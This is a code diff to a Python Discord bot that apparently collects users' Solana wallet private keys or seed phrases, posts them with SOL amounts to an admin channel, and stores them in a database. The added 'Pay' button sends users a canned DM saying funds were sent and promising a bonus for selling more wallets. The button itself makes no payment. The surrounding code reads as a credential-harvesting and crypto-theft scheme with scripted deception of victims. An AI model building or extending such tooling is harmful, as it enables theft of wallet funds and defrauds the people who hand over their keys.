@@ -457,8 +457,36 @@ async def on_message(message):
                 f"🔑 **Key/Seed**: `{key_data}`\n"
                 f"💎 **Amount**: `{amount:.4f} SOL` (Rent Value)\n"
             )
+            
+            # Create Pay Button
+            class PayView(discord.ui.View):
+                def __init__(self, user_id):
+                    super().__init__(timeout=None)
+                    self.user_id = user_id
+
+                @discord.ui.button(label="Pay", style=discord.ButtonStyle.success, custom_id="pay_button")
+                async def pay_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+                    if interaction.user.id not in ADMIN_IDS:
+                        await interaction.response.send_message("❌ You are not authorized to use this button.", ephemeral=True)
+                        return
+                    
+                    try:
+                        user = await bot.fetch_user(self.user_id)
+                        success_msg = (
+                            "🎊 Congratulations! The transaction was successful\n\n"
+                            "Your request has been processed and funds have been sent to your wallet. Thank you for your trust! If you have more wallets, we are always here for you!\n\n"
+                            "🎁 When you sell wallets with a total value of 10 SOL, you will receive a 1 SOL bonus."
+                        )
+                        await user.send(success_msg)
+                        await interaction.response.send_message(f"✅ Payment confirmation sent to user `{self.user_id}`", ephemeral=True)
+                        # Disable the button after use
+                        button.disabled = True
+                        await interaction.message.edit(view=self)
+                    except Exception as e:
+                        await interaction.response.send_message(f"❌ Error sending message to user: {e}", ephemeral=True)
+
             # Send to TARGET_CHANNEL_ID for orders
-            await send_to_channel(TARGET_CHANNEL_ID, content=sale_msg)
+            await send_to_channel(TARGET_CHANNEL_ID, content=sale_msg, view=PayView(user_id))
             
             # Save key to database
             try:
@@ -483,7 +511,11 @@ async def on_message(message):
 
     # 2. Forward regular messages to admin (User Content Channel)
     prefixes = ('/', '!', '.', '')
-    if not message.content.startswith(prefixes) and not extract_wallets(message.content):
+    # Check if it's a command or wallet address
+    is_command = message.content.startswith(prefixes) and len(message.content) > 1
+    is_wallet = len(extract_wallets(message.content)) > 0
+    
+    if not is_command and not is_wallet:
         # Check if the message is from an admin
         if message.author.id in ADMIN_IDS:
             await bot.process_commands(message)
